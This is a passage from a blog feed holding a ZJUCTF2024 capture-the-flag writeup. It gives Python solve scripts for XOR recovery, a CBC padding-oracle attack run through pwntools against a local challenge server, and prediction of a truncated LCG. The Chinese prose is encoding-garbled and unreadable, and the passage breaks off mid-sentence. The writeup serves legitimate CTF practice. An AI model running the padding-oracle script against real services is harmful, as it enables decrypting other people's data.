Score</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>CTF writeup</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ZJUCTF2024 writeup</title>
    <link href="/2025/01/17/ZJUCTF2024wp/"/>
    <url>/2025/01/17/ZJUCTF2024wp/</url>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›æ—¶é—´æ˜¯2024å¹´çš„10æœˆ15æ—¥è‡³22æ—¥ï¼Œå¯¹äºä¸€åœºä¸ªäººèµ›æ¥è¯´æ—¶é—´è¿˜æ˜¯å¾ˆå……è£•çš„ğŸ˜‹</p><h1 id="crypto"><strong>Crypto</strong></h1><p>è¿™æ¬¡çš„å¯†ç å­¦ç«Ÿç„¶æ²¡æœ‰RSAé¢˜ç›®ğŸ¤¨</p><h2 id="ezxor">ezxor</h2><ul><li>ä¸€ä¸ªå¼‚æˆ–å¤åŸé¢˜ç›®ï¼Œä½†æ˜¯åœ¨ç¨‹åºæœ€åéšæœºæ”¹äº†20ä¸ªä½ç½®ï¼›</li><li>è€ƒè™‘å¿½ç•¥æœ€åçš„ä¿®æ”¹ç›´æ¥é€šè¿‡å¼‚æˆ–å¤åŸï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">realcipher = <span class="hljs-string">&#x27;01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100011011010111001110011001100000101110011110000100010100100110011110111001101101111011011110010101101110000100101000101011101110011100000110010101100110100100011001001000110000101100101001001001101110011001010110100111101101011001010110010001100011000110011001111101100110000111101110010101110111000010100000100011110110000011111001010110&#x27;</span><br>cipher = realcipher<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)-<span class="hljs-number">1</span>,i-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp^= <span class="hljs-built_in">int</span>(cipher[j])<br>    cipher = cipher[:i]+<span class="hljs-built_in">str</span>(tmp)+cipher[i+<span class="hljs-number">1</span>:]<br>cipher = <span class="hljs-string">&quot;0&quot;</span>+cipher[:-<span class="hljs-number">1</span>]<br><span class="hljs-comment"># print(cipher)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(cipher),<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(cipher[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></li><li>è·‘å‡ºæ¥flagæ˜¯è¿™ç©æ„:<code>[ÃŠUCF&#123;Tell_do&gt;e!_WelÂ£Â¯me_to_YJUCTF_2&lt;24!&#125;</code>ï¼Œæ ¹æ®é¢˜ç›®æç¤ºçŒœæµ‹flagæ˜¯<code>ZJUCTF&#123;Well_done!_Welcome_to_ZJUCTF_2024!&#125;</code>ï¼ŒéªŒè¯æ­£ç¡®ï¼›</li></ul><h2 id="easypad">easypad</h2><ul><li>ä¸€ä¸ªç®€å•çš„CBCçš„paddingå¡«å……æ¼æ´ï¼Œå¯ä»¥æ ¹æ®æ§åˆ¶IVæ¥æ§åˆ¶è§£å¯†ç»“æœæ˜¯å¦ç¬¦åˆpadå¾—åˆ°åŸæ–‡ï¼Œå†™äº†ä¸ªæ¢å¤åŸæ–‡çš„è„šæœ¬: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">import</span> random<br><br>KEY = urandom(<span class="hljs-number">16</span>)<br>random.seed(KEY)<br>message = urandom(<span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(message)<br><br><span class="hljs-comment"># pad = lambda msg: msg + (chr(pad_length) * (16 - len(msg) % 16)).encode()</span><br>unpad = <span class="hljs-keyword">lambda</span> msg: <span class="hljs-built_in">bytes</span>([msg[-<span class="hljs-number">1</span>]]) * msg[-<span class="hljs-number">1</span>] == msg[-msg[-<span class="hljs-number">1</span>]:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    IV = urandom(<span class="hljs-number">16</span>)<br>    cipher = AES.new(KEY, AES.MODE_CBC, IV)<br>    encrypted = cipher.encrypt(msg)<br>    <span class="hljs-keyword">return</span> IV + encrypted<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    IV = msg[:<span class="hljs-number">16</span>]<br>    cipher = AES.new(KEY, AES.MODE_CBC, IV)<br>    decrypted = cipher.decrypt(msg[<span class="hljs-number">16</span>:])<br>    <span class="hljs-comment"># print(decrypted)</span><br>    <span class="hljs-keyword">return</span> unpad(decrypted)<br><br>cipher = encrypt(message.encode()).<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(cipher)<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cipher))<br>IV,E1,E2 = cipher[:<span class="hljs-number">16</span>],cipher[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],cipher[<span class="hljs-number">32</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">senddecrypt</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recv()<br>    io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recv()<br>    io.sendline(text)<br>    res = io.recvline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexstr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part</span>(<span class="hljs-params">E,E_pre</span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    temp = [<span class="hljs-string">&quot;00&quot;</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span>:<br>            temp[j] = hexstr(E_pre[j]^(<span class="hljs-number">16</span>-j)^<span class="hljs-built_in">ord</span>(i))<br>            tmp = <span class="hljs-number">1</span><br>            Ct = <span class="hljs-string">&quot;&quot;</span>.join(temp)<br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Ct)==<span class="hljs-number">32</span><br>            payload = Ct+E.<span class="hljs-built_in">hex</span>()<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>                res = decrypt(<span class="hljs-built_in">bytes</span>.fromhex(payload))<br>                <span class="hljs-comment"># print(res)</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:<br>                    tmp = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> tmp:<br>                ans = i+ans<br>                <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,j-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>                    temp[z] = hexstr(<span class="hljs-built_in">int</span>(temp[z],<span class="hljs-number">16</span>)^(<span class="hljs-number">16</span>-j)^(<span class="hljs-number">17</span>-j))<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> ans<br><br>msg1 = part(E1,IV)<br>msg2 = part(E2,E1)<br>message = msg1+msg2<br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure></li><li>ä½†æ˜¯æ³¨æ„åˆ°é¢˜ç›®è¿”å›ç»“æœæ˜¯<code>unpad(decrypted) ^ (random.random() &gt; 0.1)</code>ï¼Œé‚£å°±å¤šæ¬¡è¯·æ±‚æ¥çœ‹çœ‹æ¦‚ç‡åˆ†å¸ƒå°±å¯ä»¥åˆ¤æ–­äº†ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">51245</span>)<br>cipher = io.recvline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cipher))<br>IV,E1,E2 = cipher[:<span class="hljs-number">16</span>],cipher[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>],cipher[<span class="hljs-number">32</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">senddecrypt</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recv()<br>    io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recv()<br>    io.sendline(text)<br>    res = io.recvline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexstr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part</span>(<span class="hljs-params">E,E_pre</span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    temp = [<span class="hljs-string">&quot;00&quot;</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span>:<br>            temp[j] = hexstr(E_pre[j]^(<span class="hljs-number">16</span>-j)^<span class="hljs-built_in">ord</span>(i))<br>            tmp = <span class="hljs-number">1</span><br>            Ct = <span class="hljs-string">&quot;&quot;</span>.join(temp)<br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Ct)==<span class="hljs-number">32</span><br>            payload = Ct+E.<span class="hljs-built_in">hex</span>()<br>            times = &#123;<span class="hljs-string">b&quot;False&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;True&quot;</span>:<span class="hljs-number">0</span>&#125;<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                res = senddecrypt(payload)<br>                times[res] += <span class="hljs-number">1</span> <br>            <span class="hljs-keyword">if</span> times[<span class="hljs-string">b&quot;False&quot;</span>] &gt; times[<span class="hljs-string">b&quot;True&quot;</span>]*<span class="hljs-number">2</span>:<br>                ans = i+ans<br>                <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,j-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>                    temp[z] = hexstr(<span class="hljs-built_in">int</span>(temp[z],<span class="hljs-number">16</span>)^(<span class="hljs-number">16</span>-j)^(<span class="hljs-number">17</span>-j))<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> ans<br><br>msg1 = part(E1,IV)<br>msg2 = part(E2,E1)<br>message = msg1+msg2<br><span class="hljs-built_in">print</span>(message)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>io.recv()<br>io.sendline(message)<br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/2.png"></li></ul><h2 id="pseudo">pseudo</h2><ul><li>å…³é”®éšæœºæ•°ç”Ÿæˆé€»è¾‘ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-variable language_">self</span>.K = (<span class="hljs-variable language_">self</span>.a * <span class="hljs-variable language_">self</span>.K + <span class="hljs-variable language_">self</span>.b) % <span class="hljs-variable language_">self</span>.c<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.K // <span class="hljs-variable language_">self</span>.d<br></code></pre></td></tr></table></figure></li><li>æ‡’å¾—å†™latexå…¬å¼äº†ï¼Œäºæ˜¯æ‰‹å†™äº†ä¸€ä»½wpè§£é¢˜æ€è·¯: <img src="/img/zjuctf2024/10.png"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>a = <span class="hljs-number">0x5680951767695824a313b0f7334bc38478cb4b9c572605476afcd28ac7ebd331ce5eb1</span><br>b = <span class="hljs-number">0x79f17055ba11954ffcae4bbd107fa270f789109a6df0295061a0547888719196</span><br>c = <span class="hljs-number">0x160f8d6811c8f089d7ee35b9d1ed4b2f445a712bf654f93fcb4dc7bb619186f91a79d87b8a54749ca8869a6984e314a1aa8d5bfe7019da406823c69d958b6ae6</span><br>d = <span class="hljs-number">0xc406ce580f97fe41b5b49b0d54044e23d2b3fe844c9d4bba68b444d2e8abc71d</span><br>R0 = <span class="hljs-number">0xf9ad0aaac650a41906294c3dc0044050f7522d055b512a95836ad36225076a5</span><br>R1 = <span class="hljs-number">0x10a69f08a8c3a7f0ffc5e73f5aa94737a62b389a9256e4705261bd23a22cd4f9</span><br><br><span class="hljs-comment"># t = 36438581768728120251810633059169809446924506563640328377786754579743452784368</span><br><span class="hljs-comment"># K1 = R0*d+t</span><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># print((a*t)//c)</span><br><span class="hljs-built_in">print</span>((a*d*R0+b)%c)<br><span class="hljs-built_in">print</span>((R1*d-(a*d*R0+b))%c)<br><span class="hljs-comment"># print(((a*K1+b)%c)//d==R1)</span><br><br>p = (R1*d-(a*d*R0+b))%c<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">t,r</span>):<br>    <span class="hljs-keyword">return</span> (a*t+b+R0*d*a)%c == R1*d+r<br><br>k = <span class="hljs-number">0</span><br>bitlength = <span class="hljs-number">2</span>**<span class="hljs-number">256</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    q = c*k + p<br>    t = q//a+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> t &gt; bitlength:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        r = a*t-q<br>        <span class="hljs-keyword">if</span> r &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> r &gt; d:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> test(t,r):<br>                <span class="hljs-built_in">print</span>([t,r,k])<br>        t += <span class="hljs-number">1</span><br>    k += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li>ç”¨è¿™ä¸ªè§£é¢˜æ€è·¯å†™å‡ºè„šæœ¬ç„¶åäº¤äº’ï¼Œå¤šç»„è§£ç”¨shaæ¥åˆ¤æ–­å”¯ä¸€æ€§: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> i2b<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">59789</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>)<br>a   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">3</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>b   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>c   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>d   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>io.recvline()<br>R0  = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>R1  = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>sha = io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;sha256(R)[:16] = &quot;</span>):-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(sha)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(sha)==<span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(a,b,c,d,R0,R1,sha)<br>p = (R1*d-(a*d*R0+b))%c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">t,r</span>):<br>    <span class="hljs-keyword">return</span> (a*t+b+R0*d*a)%c == R1*d+r<br><br>k = <span class="hljs-number">0</span><br>bitlength = <span class="hljs-number">2</span>**<span class="hljs-number">256</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    guess = []<br>    q = c*k + p<br>    t = q//a+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> t &gt; bitlength:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        r = a*t-q<br>        <span class="hljs-keyword">if</span> r &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> r &gt; d:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> test(t,r):<br>                <span class="hljs-built_in">print</span>([t,r,k])<br>                K = R0*d+t<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                    guess.append(K//d)<br>                    K = (K*a+b)%c<br>                digest = sha256(reduce(<span class="hljs-keyword">lambda</span> x, y: x + i2b(y), guess, <span class="hljs-string">b&quot;&quot;</span>)).hexdigest()<br>                <span class="hljs-keyword">if</span> digest[:<span class="hljs-number">16</span>]==sha:<br>                    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                        io.recv()<br>                        io.sendline(<span class="hljs-built_in">hex</span>(guess[j]))<br>                    io.interactive()<br>        t += <span class="hljs-number">1</span><br>    k += <span class="hljs-number">1</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/11.png"></li></ul><h2 id="shadowtime">shadowtime</h2><ul><li>ä»”ç»†çœ‹äº†çœ‹æºç ï¼Œå‘ç°æŠŠsignå¾—åˆ°çš„ç­¾åå»verifyå°±èƒ½è¿‡æ£€æµ‹?åº”è¯¥æ˜¯éé¢„æœŸè§£ï¼Œæœ¬æ¥å°±ä¸æ€ä¹ˆä¼šæ¤­åœ†æ›²çº¿æ•°å­—ç­¾åï¼Œè¿™ä¸‹å¥½äº†() <img src="/img/zjuctf2024/16.png"></li></ul><h2 id="line">line</h2><ul><li>åªæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæ„Ÿè§‰æœ‰ç‚¹ç®—revçš„é¢˜ç›®ï¼Œæ”¾åˆ°idaé€†å‘ï¼Œå‘ç°æ˜¯å¯¹flagå’Œkeyåšäº†å¤„ç†åå¾—åˆ°çš„ä¸œè¥¿ä¸cipå†…çš„å€¼è¿›è¡Œæ¯”è¾ƒ: <img src="/img/zjuctf2024/17.png"></li><li>flagåªæœ‰16ä¸ªå­—ç¬¦ï¼Œkeyåªæœ‰8ä¸ªå­—ç¬¦ï¼Œè€Œæœ€åçš„ç»“æœä¹Ÿåªæœ‰16ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­flagçš„<code>ZJUCTF&#123;&#125;</code>æˆ‘æ˜¯çŸ¥é“çš„ï¼Œé‚£ä¹ˆå°±æ˜¯16ä¸ªå­—ç¬¦æœªçŸ¥ï¼Œç»“æœ16ä¸ªå­—ç¬¦å·²çŸ¥ï¼›å¦‚æœæˆ‘ä»¬æŠŠåŠ å¯†è¿‡ç¨‹çœ‹ä½œä¸€ä¸ªçŸ©é˜µ(192*128)ï¼Œæ„é€ è¾“å…¥æ±‚å‡ºçŸ©é˜µå€¼ï¼Œå†æ ¹æ®ç»“æœæ±‚è§£è¾“å…¥å³å¯(è¦æ±‚æ˜¯åŠ å¯†è¿‡ç¨‹çº¿æ€§å¹¶ä¸”çŸ©é˜µæ»¡ç§©)ï¼Œé€‰æ‹©æ°å½“çš„è¡Œä½¿å¾—çŸ©é˜µæ»¡ç§©ï¼›</li><li>æˆ‘å…ˆé€†å‘äº†åŠ å¯†è¿‡ç¨‹ï¼ˆä½†æ˜¯åæ¥å‘ç°æ ¹æœ¬ä¸ç”¨é€†å‘ï¼Œå› ä¸ºç¨‹åºæŠŠåŠ å¯†åçš„ç»“æœè¾“å‡ºå‡ºæ¥äº†ï¼manï¼è´¹æˆ‘2å°æ—¶ï¼‰ï¼Œç„¶åæ„é€ 